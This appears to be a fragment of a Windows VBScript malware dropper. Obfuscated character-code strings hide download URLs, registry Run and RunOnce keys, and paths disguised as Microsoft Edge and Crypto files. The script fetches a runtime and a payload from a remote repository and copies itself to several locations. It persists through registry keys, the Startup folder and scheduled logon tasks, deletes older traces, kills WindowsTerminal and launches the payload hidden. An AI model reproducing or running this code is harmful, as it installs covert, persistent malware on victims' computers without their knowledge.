R1 = "Dk("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,116,111,112,100,97,115,104,99,97,118,97,108,114,121,47,109,99,102,105,108,101,115,47,109,97,105,110,47,114,101,100,105,115,116,46,122,105,112")"
R2 = "Dk("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,116,111,112,100,97,115,104,99,97,118,97,108,114,121,47,109,99,102,105,108,101,115,47,109,97,105,110,47,116,101,108,101,109,101,116,114,121,46,100,97,116")"
RV2 = "Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101")"
RO2 = "Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,79,110,99,101,92,77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101")"
T2 = "Dk("77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101,50")"
O1 = "Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,98,111,111,116,46,118,98,115")"
O2 = "Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,99,97,99,104,101,45,104,101,108,112,101,114,46,99,109,100")"
O3 = "Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,77,97,99,104,105,110,101,75,101,121,115,46,98,97,116")"
O4 = "Dk("92,77,105,99,114,111,115,111,102,116,92,80,114,111,116,101,99,116,92,115,121,115,107,101,121,115,46,98,97,116")"
O5 = "Dk("92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,87,69,82,92,82,101,112,111,114,116,65,114,99,104,105,118,101,92,119,101,114,115,118,99,46,99,109,100")"
O6 = "Dk("92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,46,99,109,100")"
O7 = "Dk("92,107,101,101,112,97,108,105,118,101,46,99,109,100")"
O8 = "Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,80,121,116,104,111,110")"
O9 = "Dk("87,105,110,100,111,119,115,84,101,114,109,105,110,97,108,46,101,120,101")"

RT = sh.ExpandEnvironmentStrings(RT)
ST = sh.ExpandEnvironmentStrings(ST)
P1 = sh.ExpandEnvironmentStrings(P1)
P2 = sh.ExpandEnvironmentStrings(P2)
P3 = sh.ExpandEnvironmentStrings(P3)
K1 = sh.ExpandEnvironmentStrings(K1)
K2 = sh.ExpandEnvironmentStrings(K2)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' payload - embedded hex first, then repo
If Not fo.FileExists(P1) Then
    Dim e
    e = ""
    If Len(e) > 8 Then
        Dim f
        Set f = fo.CreateTextFile(P1, True, False)
        f.Write H2B(e)
        f.Close
    End If
End If
If Not fo.FileExists(P1) Then
    DL R2, P1
End If
If Not fo.FileExists(P2) Then fo.CopyFile P1, P2, True
If Not fo.FileExists(P3) Then fo.CopyFile P1, P3, True

' clone this helper to the other seeds
Dim K
For Each K In Array(K2, K3, K4, K5)
    If Not fo.FileExists(K) Then
        fo.CopyFile WScript.ScriptFullName, K, True
    End If
Next

' triggers
sh.RegWrite RK, "wscript.exe """ & K1 & """", "REG_SZ"
Dim SP
SP = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
If Not fo.FileExists(SP & "\" & SV) Then
    fo.CopyFile WScript.ScriptFullName, SP & "\" & SV, True
End If
sh.Run "schtasks /create /tn " & TS & " /tr ""wscript.exe \""" & K1 & "\"""" /sc onlogon /f /rl LIMITED", 0, True
sh.RegWrite RV2, "wscript.exe """ & K1 & """", "REG_SZ"
sh.RegWrite RO2, "wscript.exe """ & K1 & """", "REG_SZ"
sh.Run "schtasks /create /tn " & T2 & " /tr ""wscript.exe \""" & K1 & "\"""" /sc onlogon /f /rl LIMITED", 0, True

' retire old layout if present
sh.RegDelete OR
Dim OL
For Each OL In Array(AP & O1, AP & O2, AP & O3, AP & O4, AP & O5, SP & O6, SP & O7)
    If fo.FileExists(OL) Then fo.DeleteFile OL, True
Next
If fo.FolderExists(AP & O8) Then fo.DeleteFolder AP & O8, True
sh.Run "taskkill /f /im " & O9, 0, True

' launch payload windowless
If fo.FileExists(P1) Then
    sh.Run """" & RT & "\" & PY & """ """ & P1 & """", 0, False
End If
